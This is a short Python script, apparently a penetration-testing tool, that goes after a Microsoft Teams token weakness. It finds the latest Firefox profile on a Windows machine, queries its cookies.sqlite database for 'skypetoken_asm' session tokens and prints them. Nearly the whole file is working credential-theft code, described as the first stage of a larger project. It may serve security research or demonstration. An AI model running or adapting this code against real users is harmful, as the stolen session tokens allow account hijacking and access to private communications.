# This will take advantage of the Microsoft TEAMS vulnerability first discovered by vectra (https://www.vectra.ai/) 
# This is only the first part of my development of this project and will capture the token from the device.
# Writeup @ https://medium.com/@ekiser_48014/python-penetration-testing-this-team-must-be-token-851fb8af92b8

import os
import sqlite3

def extract_skype_tokens_from_firefox():
    # Get the default path to the Firefox profile directory on Windows
    appdata_path = os.getenv('APPDATA')
    firefox_profile_path = os.path.join(appdata_path, 'Mozilla', 'Firefox', 'Profiles')

    # Find the latest Firefox profile directory
    profiles = os.listdir(firefox_profile_path)
    latest_profile = max(profiles, key=lambda d: os.path.getmtime(os.path.join(firefox_profile_path, d)))

    # Construct the full path to the latest Firefox profile directory
    profile_directory = os.path.join(firefox_profile_path, latest_profile)

    # Check if the cookies database file exists
    cookies_db_path = os.path.join(profile_directory, 'cookies.sqlite')
    if not os.path.isfile(cookies_db_path):
        print("Firefox cookies database file not found.")
        return

    # Connect to the cookies database and execute the query
    conn = sqlite3.connect(cookies_db_path)
    cursor = conn.cursor()
    cursor.execute('SELECT value FROM moz_cookies WHERE name = "skypetoken_asm"')

    # Fetch the Skype tokens from the query result
    skype_tokens = [row[0] for row in cursor.fetchall()]

    # Process or utilize the Skype tokens as needed
    for i, token in enumerate(skype_tokens, start=1):
        # Perform actions with each Skype token
        print(f"Skype Token #{i}: {token}")

    # Close the cursor and the database connection
    cursor.close()
    conn.close()

# usage:
extract_skype_tokens_from_firefox()
